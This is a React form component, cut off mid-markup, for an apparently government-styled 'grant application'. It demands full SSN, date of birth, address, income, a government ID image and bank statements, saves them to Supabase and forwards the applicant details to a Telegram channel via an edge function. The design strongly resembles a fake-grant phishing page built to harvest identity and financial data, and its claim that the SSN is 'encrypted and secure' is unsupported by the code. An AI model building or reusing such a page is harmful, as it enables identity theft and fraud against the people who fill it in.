import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "sonner";
import {
  User,
  Briefcase,
  FileText,
  Upload,
  CheckCircle2,
  ChevronRight,
  ChevronLeft,
  Shield,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import SubmissionSuccessDialog from "./SubmissionSuccessDialog";

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const ACCEPTED_FILE_TYPES = ["application/pdf", "image/jpeg", "image/png", "image/jpg"];

const formSchema = z.object({
  // Step 1: Personal Information
  firstName: z.string().min(2, "First name must be at least 2 characters").max(50),
  lastName: z.string().min(2, "Last name must be at least 2 characters").max(50),
  email: z.string().email("Please enter a valid email address"),
  phone: z.string().min(10, "Phone number must be at least 10 digits").max(15),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  ssn: z.string().regex(/^\d{3}-\d{2}-\d{4}$/, "SSN must be in format XXX-XX-XXXX"),
  
  // Address
  streetAddress: z.string().min(5, "Street address is required").max(100),
  city: z.string().min(2, "City is required").max(50),
  state: z.string().min(2, "State is required"),
  zipCode: z.string().regex(/^\d{5}(-\d{4})?$/, "Please enter a valid ZIP code"),
  
  // Step 2: Work Information
  employmentStatus: z.string().min(1, "Employment status is required"),
  employerName: z.string().optional(),
  jobTitle: z.string().optional(),
  annualIncome: z.string().min(1, "Annual income is required"),
  yearsEmployed: z.string().optional(),
  workPhone: z.string().optional(),
  workAddress: z.string().optional(),
  
  // Step 3: Grant Information
  grantType: z.string().min(1, "Please select a grant type"),
  requestedAmount: z.string().min(1, "Requested amount is required"),
  purposeOfGrant: z.string().min(50, "Please provide at least 50 characters describing the purpose").max(1000),
  organizationName: z.string().optional(),
  organizationType: z.string().optional(),
  
  // Step 4: Consent
  certifyInformation: z.boolean().refine((val) => val === true, "You must certify the information is accurate"),
  agreeToTerms: z.boolean().refine((val) => val === true, "You must agree to the terms and conditions"),
  authorizeBackground: z.boolean().refine((val) => val === true, "You must authorize the background check"),
});

type FormData = z.infer<typeof formSchema>;

const steps = [
  { id: 1, title: "Personal Info", icon: User },
  { id: 2, title: "Work Info", icon: Briefcase },
  { id: 3, title: "Grant Details", icon: FileText },
  { id: 4, title: "Documents", icon: Upload },
  { id: 5, title: "Review", icon: CheckCircle2 },
];

const usStates = [
  "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
  "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa",
  "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
  "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
  "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio",
  "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota",
  "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
  "Wisconsin", "Wyoming"
];

// Generate unique application number
const generateApplicationNumber = (): string => {
  const year = new Date().getFullYear();
  const randomPart = Math.random().toString(36).substring(2, 8).toUpperCase();
  const timestamp = Date.now().toString(36).substring(-4).toUpperCase();
  return `FG-${year}-${randomPart}${timestamp}`.substring(0, 16);
};

const GrantApplicationForm = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [idCardFile, setIdCardFile] = useState<File | null>(null);
  const [bankStatementFile, setBankStatementFile] = useState<File | null>(null);
  const [additionalDocs, setAdditionalDocs] = useState<File[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [submissionData, setSubmissionData] = useState<{
    applicationNumber: string;
    applicantName: string;
    email: string;
  } | null>(null);

  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      email: "",
      phone: "",
      dateOfBirth: "",
      ssn: "",
      streetAddress: "",
      city: "",
      state: "",
      zipCode: "",
      employmentStatus: "",
      employerName: "",
      jobTitle: "",
      annualIncome: "",
      yearsEmployed: "",
      workPhone: "",
      workAddress: "",
      grantType: "",
      requestedAmount: "",
      purposeOfGrant: "",
      organizationName: "",
      organizationType: "",
      certifyInformation: false,
      agreeToTerms: false,
      authorizeBackground: false,
    },
  });

  const handleFileUpload = (
    event: React.ChangeEvent<HTMLInputElement>,
    setFile: React.Dispatch<React.SetStateAction<File | null>>
  ) => {
    const file = event.target.files?.[0];
    if (file) {
      if (file.size > MAX_FILE_SIZE) {
        toast.error("File size must be less than 10MB");
        return;
      }
      if (!ACCEPTED_FILE_TYPES.includes(file.type)) {
        toast.error("Please upload a PDF, JPG, or PNG file");
        return;
      }
      setFile(file);
      toast.success(`${file.name} uploaded successfully`);
    }
  };

  const handleMultipleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const files = event.target.files;
    if (files) {
      const validFiles: File[] = [];
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        if (file.size > MAX_FILE_SIZE) {
          toast.error(`${file.name} is too large (max 10MB)`);
          continue;
        }
        if (!ACCEPTED_FILE_TYPES.includes(file.type)) {
          toast.error(`${file.name} is not a valid file type`);
          continue;
        }
        validFiles.push(file);
      }
      setAdditionalDocs((prev) => [...prev, ...validFiles]);
      if (validFiles.length > 0) {
        toast.success(`${validFiles.length} file(s) uploaded`);
      }
    }
  };

  const removeAdditionalDoc = (index: number) => {
    setAdditionalDocs((prev) => prev.filter((_, i) => i !== index));
  };

  const validateStep = async (step: number): Promise<boolean> => {
    let fieldsToValidate: (keyof FormData)[] = [];
    
    switch (step) {
      case 1:
        fieldsToValidate = [
          "firstName", "lastName", "email", "phone", "dateOfBirth", "ssn",
          "streetAddress", "city", "state", "zipCode"
        ];
        break;
      case 2:
        fieldsToValidate = ["employmentStatus", "annualIncome"];
        break;
      case 3:
        fieldsToValidate = ["grantType", "requestedAmount", "purposeOfGrant"];
        break;
      case 4:
        if (!idCardFile) {
          toast.error("Please upload your ID card");
          return false;
        }
        if (!bankStatementFile) {
          toast.error("Please upload your bank statement");
          return false;
        }
        return true;
      case 5:
        fieldsToValidate = ["certifyInformation", "agreeToTerms", "authorizeBackground"];
        break;
    }
    
    const result = await form.trigger(fieldsToValidate);
    return result;
  };

  const nextStep = async () => {
    const isValid = await validateStep(currentStep);
    if (isValid && currentStep < 5) {
      setCurrentStep((prev) => prev + 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep((prev) => prev - 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  // Helper to upload a file to Supabase Storage and return path
  const uploadFileToStorage = async (
    file: File,
    applicationNumber: string,
    category: string
  ): Promise<{ path: string; name: string; type: string; size: string; category: string } | null> => {
    const safeFileName = file.name.replace(/[^a-zA-Z0-9._-]/g, "_");
    const filePath = `applications/${applicationNumber}/${category.replace(/\s+/g, "_")}_${safeFileName}`;

    const { error } = await supabase.storage
      .from("grant-documents")
      .upload(filePath, file, { upsert: true });

    if (error) {
      console.error(`Failed to upload ${category}:`, error);
      return null;
    }

    return {
      path: filePath,
      name: file.name,
      type: file.type,
      size: `${(file.size / 1024).toFixed(2)} KB`,
      category,
    };
  };

  const onSubmit = async (data: FormData) => {
    const isValid = await validateStep(5);
    if (!isValid) return;

    setIsSubmitting(true);
    const applicationNumber = generateApplicationNumber();

    try {
      // Upload files to storage
      const uploadPromises: Promise<{
        path: string;
        name: string;
        type: string;
        size: string;
        category: string;
      } | null>[] = [];

      if (idCardFile) {
        uploadPromises.push(uploadFileToStorage(idCardFile, applicationNumber, "ID Card"));
      }
      if (bankStatementFile) {
        uploadPromises.push(uploadFileToStorage(bankStatementFile, applicationNumber, "Bank Statement"));
      }
      additionalDocs.forEach((doc, index) => {
        uploadPromises.push(
          uploadFileToStorage(doc, applicationNumber, `Additional Document ${index + 1}`)
        );
      });

      const uploadResults = await Promise.all(uploadPromises);
      const uploadedFiles = uploadResults.filter(
        (f): f is { path: string; name: string; type: string; size: string; category: string } =>
          f !== null
      );

      if (uploadedFiles.length === 0 && (idCardFile || bankStatementFile)) {
        throw new Error("Failed to upload required documents");
      }

      // Save to database
      const { error: dbError } = await supabase
        .from("grant_applications")
        .insert({
          application_number: applicationNumber,
          first_name: data.firstName,
          last_name: data.lastName,
          email: data.email,
          phone: data.phone,
          date_of_birth: data.dateOfBirth,
          ssn_last_four: data.ssn.slice(-4),
          street_address: data.streetAddress,
          city: data.city,
          state: data.state,
          zip_code: data.zipCode,
          employment_status: data.employmentStatus,
          employer_name: data.employerName,
          job_title: data.jobTitle,
          annual_income: data.annualIncome,
          grant_type: data.grantType,
          requested_amount: data.requestedAmount,
          purpose_of_grant: data.purposeOfGrant,
          organization_name: data.organizationName,
          organization_type: data.organizationType,
          uploaded_files: uploadedFiles,
        });

      if (dbError) {
        console.error("Database error:", dbError);
        throw new Error("Failed to save application");
      }

      console.log("Application saved to database:", applicationNumber);

      // Prepare data for Telegram (include file paths so edge function can generate signed URLs)
      const submissionPayload = {
        applicationNumber,
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        dateOfBirth: data.dateOfBirth,
        ssn: data.ssn.replace(/\d/g, "*").slice(0, -4) + data.ssn.slice(-4),
        streetAddress: data.streetAddress,
        city: data.city,
        state: data.state,
        zipCode: data.zipCode,
        employmentStatus: data.employmentStatus,
        employerName: data.employerName,
        jobTitle: data.jobTitle,
        annualIncome: data.annualIncome,
        grantType: data.grantType,
        requestedAmount: data.requestedAmount,
        purposeOfGrant: data.purposeOfGrant,
        organizationName: data.organizationName,
        organizationType: data.organizationType,
        uploadedFiles,
        submittedAt: new Date().toLocaleString(),
      };

      // Send to Telegram via edge function
      const { data: result, error } = await supabase.functions.invoke(
        "send-to-telegram",
        { body: submissionPayload }
      );

      if (error) {
        console.error("Error sending to Telegram:", error);
        toast.warning(
          "Application submitted, but notification failed to send. Please try again in a moment."
        );
      } else {
        console.log("Telegram notification sent:", result);
      }

      // Show success dialog
      setSubmissionData({
        applicationNumber,
        applicantName: `${data.firstName} ${data.lastName}`,
        email: data.email,
      });
      setShowSuccessDialog(true);
    } catch (error) {
      console.error("Submission error:", error);
      toast.error("There was an error submitting your application. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const formatSSN = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length <= 3) return cleaned;
    if (cleaned.length <= 5) return `${cleaned.slice(0, 3)}-${cleaned.slice(3)}`;
    return `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}-${cleaned.slice(5, 9)}`;
  };

  const formatPhone = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length <= 3) return cleaned;
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
  };

  return (
    <div className="max-w-4xl mx-auto">
      {/* Progress Steps */}
      <div className="mb-8 overflow-x-auto">
        <div className="flex items-center justify-between min-w-[500px] md:min-w-0">
          {steps.map((step, index) => (
            <div key={step.id} className="flex items-center flex-1">
              <div className="flex flex-col items-center">
                <div
                  className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center transition-all ${
                    currentStep >= step.id
                      ? "bg-primary text-primary-foreground"
                      : "bg-muted text-muted-foreground"
                  }`}
                >
                  <step.icon className="w-5 h-5 md:w-6 md:h-6" />
                </div>
                <span
                  className={`mt-2 text-xs md:text-sm font-medium text-center ${
                    currentStep >= step.id ? "text-primary" : "text-muted-foreground"
                  }`}
                >
                  {step.title}
                </span>
              </div>
              {index < steps.length - 1 && (
                <div
                  className={`flex-1 h-1 mx-2 md:mx-4 rounded ${
                    currentStep > step.id ? "bg-primary" : "bg-muted"
                  }`}
                />
              )}
            </div>
          ))}
        </div>
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
          {/* Step 1: Personal Information */}
          {currentStep === 1 && (
            <div className="card-gov space-y-6 animate-fade-in">
              <div className="flex items-center gap-3 pb-4 border-b border-border">
                <User className="w-6 h-6 text-primary" />
                <h2 className="text-xl md:text-2xl font-semibold">Personal Information</h2>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
                <FormField
                  control={form.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>First Name *</FormLabel>
                      <FormControl>
                        <Input placeholder="John" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Last Name *</FormLabel>
                      <FormControl>
                        <Input placeholder="Doe" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Email Address *</FormLabel>
                      <FormControl>
                        <Input type="email" placeholder="john.doe@example.com" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="phone"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Phone Number *</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="(555) 123-4567"
                          {...field}
                          onChange={(e) => field.onChange(formatPhone(e.target.value))}
                          maxLength={14}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="dateOfBirth"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Date of Birth *</FormLabel>
                      <FormControl>
                        <Input type="date" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="ssn"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Social Security Number *</FormLabel>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="XXX-XX-XXXX"
                          {...field}
                          onChange={(e) => field.onChange(formatSSN(e.target.value))}
                          maxLength={11}
                        />
                      </FormControl>
                      <FormDescription className="flex items-center gap-1 text-xs">
                        <Shield className="w-3 h-3" />
                        Your SSN is encrypted and secure
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <div className="pt-4 border-t border-border">
                <h3 className="text-lg font-semibold mb-4">Residential Address</h3>
                <div className="grid grid-cols-1 gap-4 md:gap-6">
                  <FormField
                    control={form.control}
                    name="streetAddress"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Street Address *</FormLabel>
                        <FormControl>
                          <Input placeholder="123 Main Street, Apt 4B" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
                    <FormField
                      control={form.control}
                      name="city"
                      render={({ field }) => (
                        <FormItem className="sm:col-span-1 md:col-span-2">
                          <FormLabel>City *</FormLabel>
                          <FormControl>
                            <Input placeholder="New York" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={form.control}
                      name="state"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>State *</FormLabel>
                          <Select onValueChange={field.onChange} value={field.value}>
                            <FormControl>
                              <SelectTrigger>
                                <SelectValue placeholder="Select" />
                              </SelectTrigger>
                            </FormControl>
                            <SelectContent>
                              {usStates.map((state) => (
                                <SelectItem key={state} value={state}>
                                  {state}
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={form.control}
                      name="zipCode"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>ZIP Code *</FormLabel>
                          <FormControl>
                            <Input placeholder="10001" maxLength={10} {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Step 2: Work Information */}
          {currentStep === 2 && (
            <div className="card-gov space-y-6 animate-fade-in">
              <div className="flex items-center gap-3 pb-4 border-b border-border">
                <Briefcase className="w-6 h-6 text-primary" />
                <h2 className="text-xl md:text-2xl font-semibold">Employment Information</h2>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
                <FormField
                  control={form.control}
                  name="employmentStatus"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Employment Status *</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select status" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="employed-full">Employed Full-Time</SelectItem>
                          <SelectItem value="employed-part">Employed Part-Time</SelectItem>
                          <SelectItem value="self-employed">Self-Employed</SelectItem>
                          <SelectItem value="unemployed">Unemployed</SelectItem>
                          <SelectItem value="retired">Retired</SelectItem>
                          <SelectItem value="student">Student</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="annualIncome"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Annual Household Income *</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select range" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="0-25000">$0 - $25,000</SelectItem>
                          <SelectItem value="25001-50000">$25,001 - $50,000</SelectItem>
                          <SelectItem value="50001-75000">$50,001 - $75,000</SelectItem>
                          <SelectItem value="75001-100000">$75,001 - $100,000</SelectItem>
                          <SelectItem value="100001-150000">$100,001 - $150,000</SelectItem>
                          <SelectItem value="150001+">$150,001+</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="employerName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Employer Name</FormLabel>
                      <FormControl>
                        <Input placeholder="Company Inc." {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="jobTitle"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Job Title</FormLabel>
                      <FormControl>
                        <Input placeholder="Software Engineer" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="yearsEmployed"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Years at Current Employer</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="less-1">Less than 1 year</SelectItem>
                          <SelectItem value="1-2">1-2 years</SelectItem>
                          <SelectItem value="3-5">3-5 years</SelectItem>
                          <SelectItem value="5-10">5-10 years</SelectItem>
                          <SelectItem value="10+">10+ years</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="workPhone"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Work Phone</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="(555) 123-4567"
                          {...field}
                          onChange={(e) => field.onChange(formatPhone(e.target.value))}
                          maxLength={14}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={form.control}
                name="workAddress"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Work Address</FormLabel>
                    <FormControl>
                      <Input placeholder="456 Business Blvd, Suite 100, City, State ZIP" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>
          )}

          {/* Step 3: Grant Information */}
          {currentStep === 3 && (
            <div className="card-gov space-y-6 animate-fade-in">
              <div className="flex items-center gap-3 pb-4 border-b border-border">
                <FileText className="w-6 h-6 text-primary" />
                <h2 className="text-xl md:text-2xl font-semibold">Grant Details</h2>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
                <FormField
                  control={form.control}
                  name="grantType"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Grant Type *</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select grant type" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="education">Education</SelectItem>
                          <SelectItem value="research">Research & Science</SelectItem>
                          <SelectItem value="small-business">Small Business</SelectItem>
                          <SelectItem value="healthcare">Health & Human Services</SelectItem>
                          <SelectItem value="environment">Environment</SelectItem>
                          <SelectItem value="public-safety">Public Safety</SelectItem>
                          <SelectItem value="agriculture">Agriculture</SelectItem>
                          <SelectItem value="housing">Housing & Community</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="requestedAmount"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Requested Amount *</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select amount" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="5000-25000">$5,000 - $25,000</SelectItem>
                          <SelectItem value="25001-50000">$25,001 - $50,000</SelectItem>
                          <SelectItem value="50001-100000">$50,001 - $100,000</SelectItem>
                          <SelectItem value="100001-250000">$100,001 - $250,000</SelectItem>
                          <SelectItem value="250001-500000">$250,001 - $500,000</SelectItem>
                          <SelectItem value="500001+">$500,001+</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="organizationName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Organization Name (if applicable)</FormLabel>
                      <FormControl>
                        <Input placeholder="Organization or Business Name" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="organizationType"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Organization Type</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select type" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="individual">Individual</SelectItem>
                          <SelectItem value="nonprofit">Non-Profit 501(c)(3)</SelectItem>
                          <SelectItem value="small-business">Small Business</SelectItem>
                          <SelectItem value="educational">Educational Institution</SelectItem>
                          <SelectItem value="government">Government Entity</SelectItem>
                          <SelectItem value="tribal">Tribal Organization</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={form.control}
                name="purposeOfGrant"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Purpose of Grant *</FormLabel>
                    <FormControl>
                      <Textarea
                        placeholder="Please describe in detail how you plan to use the grant funds, the expected outcomes, and the impact on your community or organization..."
                        className="min-h-[150px] resize-y"
                        {...field}
                      />
                    </FormControl>
                    <FormDescription>
                      Minimum 50 characters. Be specific about your goals and expected outcomes.
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>
          )}

          {/* Step 4: Document Upload */}
          {currentStep === 4 && (
            <div className="card-gov space-y-6 animate-fade-in">
              <div className="flex items-center gap-3 pb-4 border-b border-border">
                <Upload className="w-6 h-6 text-primary" />
                <h2 className="text-xl md:text-2xl font-semibold">Document Upload</h2>
              </div>

              <div className="bg-muted/50 rounded-lg p-4 text-sm text-muted-foreground">
                <p className="font-medium text-foreground mb-2">Accepted file formats:</p>
                <p>PDF, JPG, PNG (Max 10MB per file)</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* ID Card Upload */}
                <div className="space-y-3">
                  <Label className="text-base font-medium">
                    Government-Issued ID Card *
                  </Label>
                  <div
                    className={`border-2 border-dashed rounded-lg p-6 text-center transition-colors ${
                      idCardFile
                        ? "border-primary bg-primary/5"
                        : "border-border hover:border-primary/50"
                    }`}
                  >
                    {idCardFile ? (
                      <div className="space-y-2">
                        <CheckCircle2 className="w-8 h-8 text-primary mx-auto" />
                        <p className="text-sm font-medium truncate">{idCardFile.name}</p>
                        <p className="text-xs text-muted-foreground">
                          {(idCardFile.size / 1024 / 1024).toFixed(2)} MB
                        </p>
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          onClick={() => setIdCardFile(null)}
                        >
                          Remove
                        </Button>
                      </div>
                    ) : (
                      <label className="cursor-pointer block">
                        <Upload className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                        <p className="text-sm text-muted-foreground mb-1">
                          Click to upload or drag and drop
                        </p>
                        <p className="text-xs text-muted-foreground">
                          Driver's License, Passport, or State ID
                        </p>
                        <input
                          type="file"
                          className="hidden"
                          accept=".pdf,.jpg,.jpeg,.png"
                          onChange={(e) => handleFileUpload(e, setIdCardFile)}
                        />
                      </label>
                    )}
                  </div>
                </div>

                {/* Bank Statement Upload */}
                <div className="space-y-3">
                  <Label className="text-base font-medium">
                    Bank Statement (Last 3 months) *
                  </Label>
                  <div
                    className={`border-2 border-dashed rounded-lg p-6 text-center transition-colors ${
                      bankStatementFile
                        ? "border-primary bg-primary/5"
                        : "border-border hover:border-primary/50"
                    }`}
                  >
                    {bankStatementFile ? (
                      <div className="space-y-2">
                        <CheckCircle2 className="w-8 h-8 text-primary mx-auto" />
                        <p className="text-sm font-medium truncate">{bankStatementFile.name}</p>
                        <p className="text-xs text-muted-foreground">
                          {(bankStatementFile.size / 1024 / 1024).toFixed(2)} MB
                        </p>
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          onClick={() => setBankStatementFile(null)}
                        >
                          Remove
                        </Button>
                      </div>
                    ) : (
                      <label className="cursor-pointer block">
                        <Upload className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                        <p className="text-sm text-muted-foreground mb-1">
                          Click to upload or drag and drop
                        </p>
                        <p className="text-xs text-muted-foreground">
                          Official bank statement PDF
                        </p>
                        <input
                          type="file"
                          className="hidden"
                          accept=".pdf,.jpg,.jpeg,.png"
                          onChange={(e) => handleFileUpload(e, setBankStatementFile)}
                        />
                      </label>
                    )}
                  </div>
                </div>
              </div>

              {/* Additional Documents */}
              <div className="space-y-3">
                <Label className="text-base font-medium">
                  Additional Supporting Documents (Optional)
                </Label>
                <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary/50 transition-colors">
                  <label className="cursor-pointer block">
                    <Upload className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                    <p className="text-sm text-muted-foreground mb-1">
                      Click to upload additional documents
                    </p>
                    <p className="text-xs text-muted-foreground">
                      Tax returns, proof of income, business plans, etc.
                    </p>
                    <input
                      type="file"
                      className="hidden"
                      accept=".pdf,.jpg,.jpeg,.png"
                      multiple
                      onChange={handleMultipleFileUpload}
                    />
                  </label>
                </div>
                {additionalDocs.length > 0 && (
                  <div className="space-y-2 mt-4">
                    {additionalDocs.map((file, index) => (
                      <div
                        key={index}
                        className="flex items-center justify-between bg-muted/50 rounded-md p-3"
                      >
                        <div className="flex items-center gap-2 min-w-0">
                          <FileText className="w-4 h-4 text-primary flex-shrink-0" />
                          <span className="text-sm truncate">{file.name}</span>
                        </div>
                        <Button
                          type="button"
                          variant="ghost"
                          size="sm"
                          onClick={() => removeAdditionalDoc(index)}
                          className="flex-shrink-0"
                        >
                          Remove
                        </Button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Step 5: Review & Submit */}
          {currentStep === 5 && (
            <div className="card-gov space-y-6 animate-fade-in">
              <div className="flex items-center gap-3 pb-4 border-b border-border">
                <CheckCircle2 className="w-6 h-6 text-primary" />
                <h2 className="text-xl md:text-2xl font-semibold">Review & Submit</h2>
              </div>

              {/* Summary */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-muted/30 rounded-lg p-4 space-y-3">
                  <h3 className="font-semibold text-primary">Personal Information</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <span className="text-muted-foreground">Name:</span>
                    <span>{form.getValues("firstName")} {form.getValues("lastName")}</span>
                    <span className="text-muted-foreground">Email:</span>
                    <span className="truncate">{form.getValues("email")}</span>
                    <span className="text-muted-foreground">Phone:</span>
                    <span>{form.getValues("phone")}</span>
                    <span className="text-muted-foreground">City, State:</span>
                    <span>{form.getValues("city")}, {form.getValues("state")}</span>
                  </div>
                </div>

                <div className="bg-muted/30 rounded-lg p-4 space-y-3">
                  <h3 className="font-semibold text-primary">Employment</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <span className="text-muted-foreground">Status:</span>
                    <span className="capitalize">{form.getValues("employmentStatus")?.replace("-", " ")}</span>
                    <span className="text-muted-foreground">Employer:</span>
                    <span>{form.getValues("employerName") || "N/A"}</span>
                    <span className="text-muted-foreground">Income:</span>
                    <span>${form.getValues("annualIncome")?.replace("-", " - $")}</span>
                  </div>
                </div>

